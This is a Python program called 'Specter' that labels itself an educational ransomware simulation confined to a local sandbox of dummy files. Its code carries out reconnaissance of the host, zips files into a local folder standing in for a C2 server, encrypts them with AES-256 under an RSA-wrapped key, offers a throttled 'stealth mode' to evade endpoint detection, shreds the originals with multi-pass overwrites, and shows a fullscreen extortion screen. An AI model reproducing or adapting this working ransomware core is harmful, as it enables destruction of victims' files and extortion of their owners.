# ==============================================================================
# Copyright (c) 2026 Specter
# 
# LEGAL DISCLAIMER:
# This software is provided for EDUCATIONAL and ACADEMIC PURPOSES ONLY.
# It is a controlled simulation designed to demonstrate cryptographic concepts,
# secure memory management, and red team methodologies in a localized sandbox.
# ==============================================================================

import os
import time
import pathlib
import secrets
import base64
import concurrent.futures
import tkinter as tk
import platform
import socket
import shutil
import psutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Rich UI Imports
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.table import Table
from rich.prompt import Prompt
from rich import print as rprint

console = Console()

class AdvancedCryptographicEngine:
    def __init__(self, sandbox_name="Target_Sandbox"):
        self.base_dir = pathlib.Path(__file__).parent.resolve()
        self.sandbox_path = self.base_dir / sandbox_name
        self.c2_path = self.base_dir / "C2_Exfiltration_Server"
        self.target_extensions = ['.txt', '.log', '.dummy']
        self.targets = [] 
        self.encrypted_targets = []
        self.stealth_mode = False

    # ==========================================
    # C2 SIMULATION: RSA KEY GENERATION
    # ==========================================
    def generate_rsa_keypair(self):
        with console.status("[bold yellow]Generating RSA-2048 C2 Key Pair...", spinner="bouncingBar"):
            self.private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
            self.public_key = self.private_key.public_key()
            time.sleep(1) # Artificial delay for UI effect
        console.print("[bold green][+] RSA Asymmetric Keys generated successfully.[/]")

    # ==========================================
    # PHASE 1: RECONNAISSANCE & ISOLATION 
    # ==========================================
    def perform_reconnaissance(self):
        with console.status("[bold yellow]Executing System Footprinting...", spinner="bouncingBar"):
            time.sleep(1.5)
            
        sys_info = Table(title="[bold red]Victim Intelligence Gathered[/]", border_style="red")
        sys_info.add_column("Vector", style="cyan")
        sys_info.add_column("Data", style="green")
        
        sys_info.add_row("Hostname", socket.gethostname())
        sys_info.add_row("OS Architecture", f"{platform.system()} {platform.release()} ({platform.machine()})")
        sys_info.add_row("Logical Processors", str(psutil.cpu_count(logical=True)))
        sys_info.add_row("Total RAM", f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB")
        sys_info.add_row("Active User", os.getlogin() if hasattr(os, 'getlogin') else "Unknown")
        
        console.print(sys_info)
        console.print("[bold green][+] System mapped. Proceeding to target acquisition.[/]\n")

    def setup_sandbox(self):
        self.sandbox_path.mkdir(exist_ok=True)
        for i in range(1, 11): # Generates 10 files for a better progress bar
            dummy_file = self.sandbox_path / f"confidential_record_{i}.txt"
            if not dummy_file.exists():
                with open(dummy_file, 'w') as f:
                    f.write(f"Symmetric encryption test payload for record {i}. DO NOT LEAK. " * 20)

    def catalog_targets(self):
        if not self.sandbox_path.exists() or "Target_Sandbox" not in str(self.sandbox_path):
            console.print("[bold red][-] CRITICAL ERROR: Sandbox perimeter breached.[/]")
            return False

        for root, _, files in os.walk(self.sandbox_path):
            for file in files:
                file_path = pathlib.Path(root) / file
                if file_path.suffix in self.target_extensions:
                    self.targets.append(file_path)
        
        # Display Targets in a Hacker Table
        table = Table(title="[bold red]Vulnerable Targets Identified[/]", border_style="red")
        table.add_column("Filename", style="cyan")
        table.add_column("Path", style="dim")
        table.add_column("Size (Bytes)", justify="right", style="green")
        
        for target in self.targets[:5]: # Show first 5 for brevity
            table.add_row(target.name, str(target.parent.name), str(os.path.getsize(target)))
        if len(self.targets) > 5:
            table.add_row("...", "...", "...")
            
        console.print(table)
        console.print(f"[bold green][+] {len(self.targets)} total valid targets queued.[/]\n")
        return True

    # ==========================================
    # PHASE 1.5: DOUBLE-EXTORTION EXFILTRATION
    # ==========================================
    def exfiltrate_data(self):
        console.print("[bold red][*] Commencing Data Exfiltration (Double Extortion)[/]")
        self.c2_path.mkdir(exist_ok=True)
        archive_name = self.c2_path / f"stolen_data_{socket.gethostname()}"
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(style="magenta"), console=console) as progress:
            task = progress.add_task("[magenta]Compressing & Exfiltrating files to C2...", total=100)
            
            # Simulate a network transfer delay
            shutil.make_archive(str(archive_name), 'zip', self.sandbox_path)
            
            for i in range(100):
                time.sleep(0.02)
                progress.update(task, advance=1)
                
        console.print(f"[bold green][+] Exfiltration successful. {len(self.targets)} files secured on remote C2.[/]\n")

    # ==========================================
    # PHASE 2: HYBRID ENCRYPTION
    # ==========================================
    def generate_and_wrap_session_key(self):
        with console.status("[bold yellow]Generating & Wrapping Symmetric Key...", spinner="bouncingBar"):
            self.session_key = secrets.token_bytes(32) 
            self.wrapped_key = self.public_key.encrypt(
                self.session_key,
                asym_padding.OAEP(mgf=asym_padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
            )
            self.key_file = self.sandbox_path / "LOCKED_KEY.bin"
            with open(self.key_file, 'wb') as f:
                f.write(self.wrapped_key)
            time.sleep(1)
            
        console.print("[bold green][+] AES-256 Key generated and wrapped via RSA-2048.[/]")
        console.print(f"[bold green][+] Locked key dropped at: {self.key_file.name}[/]\n")

    def _encrypt_single_target(self, file_path):
        """Worker function: Encrypts and obfuscates a single file."""
        try:
            with open(file_path, 'rb') as f:
                plaintext = f.read()

            iv = secrets.token_bytes(16)
            padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
            padded_data = padder.update(plaintext) + padder.finalize()

            cipher = Cipher(algorithms.AES(self.session_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()

            obfuscated_name = base64.urlsafe_b64encode(file_path.name.encode()).decode()
            encrypted_file_path = file_path.with_name(f"{obfuscated_name}.specter")
            
            with open(encrypted_file_path, 'wb') as f:
                f.write(iv + ciphertext)
            
            self.encrypted_targets.append(file_path)
            
            # If in stealth mode, add a delay to evade I/O speed detection
            if self.stealth_mode:
                time.sleep(1.5)

        except Exception as e:
            pass

    def encrypt_payload(self):
        mode_text = "STEALTH MODE (Single Threaded, Throttled)" if self.stealth_mode else f"SWARM MODE ({os.cpu_count()} Threads)"
        console.print(f"[bold red][*] Commencing Encryption: {mode_text}[/]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40, style="red"),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[red]Encrypting Sandbox...", total=len(self.targets))
            
            if self.stealth_mode:
                # Sequential encryption for stealth
                for target in self.targets:
                    self._encrypt_single_target(target)
                    progress.advance(task)
            else:
                # Multithreaded encryption for speed
                with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
                    futures = {executor.submit(self._encrypt_single_target, target): target for target in self.targets}
                    for future in concurrent.futures.as_completed(futures):
                        progress.advance(task)
                        
        console.print("[bold green][+] Payload execution complete.[/]\n")
        return True

    # ==========================================
    # PHASE 3: SECURE WIPE & VISUAL PAYLOAD
    # ==========================================
    def secure_wipe(self, file_path, passes=3):
        try:
            length = os.path.getsize(file_path)
            with open(file_path, "r+b") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(secrets.token_bytes(length)) 
                    f.flush()
                    os.fsync(f.fileno()) 
            os.remove(file_path) 
            return True
        except Exception:
            return False

    def deploy_lock_screen(self):
        root = tk.Tk()
        root.attributes('-fullscreen', True) 
        root.configure(bg='black')           
        root.title("System Compromised")
        root.bind('<Escape>', lambda e: root.destroy())

        tk.Label(root, text="SYSTEM ENCRYPTED BY SPECTER", fg='red', bg='black', font=("Courier", 50, "bold")).pack(pady=(100, 20))

        manifesto_text = """
=========================================================
YOUR LOCAL SANDBOX FILES HAVE BEEN SECURED AND EXFILTRATED.
=========================================================
1. ALL FILES HAVE BEEN COPIED TO OUR REMOTE SERVERS.
2. Target files encrypted using AES-256 in CBC mode.
3. AES key wrapped using 2048-bit RSA Public Key.
4. Original plaintext files forensically shredded.

If you fail to comply, your stolen data will be leaked.
Do not attempt to tamper with 'LOCKED_KEY.bin'.

Press the button below to simulate paying the ransom.
=========================================================
"""
        tk.Label(root, text=manifesto_text, fg='#22c55e', bg='black', font=("Courier", 16), justify="left").pack(pady=40)

        def trigger_decryption():
            btn.config(text="DECRYPTING FILES...", state=tk.DISABLED, bg='gray')
            root.update()
            self.execute_decryption_routine()
            root.destroy()

        btn = tk.Button(root, text="[ SIMULATE PAYMENT & DECRYPT ]", command=trigger_decryption, bg='red', fg='white', font=("Courier", 20, "bold"), padx=20, pady=10)
        btn.pack(pady=30)
        root.mainloop() 

    def dispose_plaintext(self):
        # FIX: Changed spinner="skull" to spinner="bouncingBar" which is universally supported
        with console.status("[bold red]Executing forensic multi-pass wipe on original files...", spinner="bouncingBar"):
            for file_path in self.encrypted_targets:
                self.secure_wipe(file_path)
        console.print(f"[bold green][+] {len(self.encrypted_targets)} original files forensically destroyed.[/]")
        
        console.print("[bold red][*] Deploying Visual Lock Screen...[/]")
        self.deploy_lock_screen()

    # ==========================================
    # PHASE 4: DECRYPTION & REVERSAL
    # ==========================================
    def execute_decryption_routine(self):
        console.print("\n[bold cyan]=== INITIATING DECRYPTION ROUTINE ===[/]")
        
        with open(self.key_file, 'rb') as f:
            wrapped_key_from_disk = f.read()
            
        unwrapped_session_key = self.private_key.decrypt(
            wrapped_key_from_disk,
            asym_padding.OAEP(mgf=asym_padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
        )

        with Progress(SpinnerColumn(), TextColumn("[cyan]Decrypting and restoring files..."), BarColumn(style="cyan"), console=console) as progress:
            encrypted_files = list(self.sandbox_path.glob("*.specter"))
            task = progress.add_task("Decrypting", total=len(encrypted_files))
            
            for encrypted_file in encrypted_files:
                with open(encrypted_file, 'rb') as f:
                    data = f.read()
                    iv = data[:16] 
                    ciphertext = data[16:]

                cipher = Cipher(algorithms.AES(unwrapped_session_key), modes.CBC(iv), backend=default_backend())
                decryptor = cipher.decryptor()
                padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

                unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
                plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

                encoded_name = encrypted_file.name.replace('.specter', '')
                original_name = base64.urlsafe_b64decode(encoded_name).decode()
                original_file_path = self.sandbox_path / original_name
                
                with open(original_file_path, 'wb') as f:
                    f.write(plaintext)
                
                os.remove(encrypted_file)
                progress.advance(task)
            
        os.remove(self.key_file)
        console.print("[bold green][+] System fully restored. Threat neutralized.[/]\n")

# ==========================================
# MAIN EXECUTION SEQUENCE
# ==========================================
if __name__ == "__main__":
    console.clear()
    console.print(Panel.fit(
        "[bold red]SPECTER C2 SERVER - ADVANCED APT FRAMEWORK[/bold red]\n"
        "[dim]SEC_LEVEL: RED TEAM SIMULATION / LOCAL ONLY[/dim]",
        border_style="red"
    ))
    
    engine = AdvancedCryptographicEngine()
    engine.generate_rsa_keypair()
    engine.perform_reconnaissance()
    engine.setup_sandbox()
    
    if engine.catalog_targets():
        # --- THE ADVERSARIAL MENU ---
        console.print("[bold yellow]Select Attack Methodology:[/]")
        console.print("  [bold white]1.[/] [bold red]Swarm Mode[/]   (Max threads, high I/O. Will trigger EDR.)")
        console.print("  [bold white]2.[/] [bold cyan]Stealth Mode[/] (Single thread, throttled I/O. Evasion attempt.)")
        
        choice = Prompt.ask("\n[bold yellow]Enter Choice[/]", choices=["1", "2"], default="1")
        if choice == "2":
            engine.stealth_mode = True
            
        engine.exfiltrate_data()
        engine.generate_and_wrap_session_key()
        if engine.encrypt_payload():
            engine.dispose_plaintext()
